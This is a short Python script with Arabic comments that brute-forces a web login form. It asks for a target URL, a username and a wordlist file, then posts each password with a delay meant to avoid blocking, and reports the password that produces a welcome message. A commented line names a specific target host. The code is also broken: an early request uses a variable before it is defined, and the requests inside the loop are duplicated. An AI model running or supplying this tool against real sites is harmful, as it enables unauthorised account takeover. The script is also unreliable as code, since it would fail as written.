import requests
import time




# رابط صفحة تسجيل الدخول
url = input("Enter the target URL (e.g., http://example.com/login.php): ")

#"http://testnano.wuaze.com/login.php"

# اسم المستخدم الذي تريد تجربة كلمات المرور له
username = input("Enter the username to brute-force: ")

# ملف كلمات المرور المحتملة
wordlist_file = input("Enter the path to the wordlist file: ")

#
response = requests.post(url, data=data, timeout=10)









# قراءة مع معالجة للأخطاء وترميز محدد
try:
    with open(wordlist_file, "r", encoding="utf-8") as f:
        passwords = {line.strip() for line in f if line.strip()} # تجاهل الأسطر الفارغة 
except FileNotFoundError: # التعامل مع خطأ عدم وجود الملف   
    print("The file was not found. please confirm the file: ", wordlist_file) # طباعة رسالة الخطأ
    exit(1) # إنهاء البرنامج مع رمز خطأ 1   









# تجربة كل كلمة مرور
for pwd in passwords:
    if not username or not pwd:
        print("[ERROR] Username or password is empty. Skipping this attempt.")
        continue




    data = {
        "username": username,
        "password": pwd
    }

    
    headers = {'Content-Type': 'application/json'} #
    response = requests.post(url, json=data, headers=headers) #
    response = requests.post(url, data=data, timeout=10)
    time.sleep(1)  # تأخير بسيط بين الطلبات لتجنب الحظر
    # تحليل الاستجابة: هنا نبحث عن كلمة نجاح أو فشل محددة في الصفحة
    if "مرحبًا" in response.text:  # هذه الجملة تظهر عند النجاح في login.php
        print(f"[SUCCESS] كلمة المرور الصحيحة: {pwd}")
        break
    else:
        print(f"[FAIL] تجربة كلمة: {pwd}")

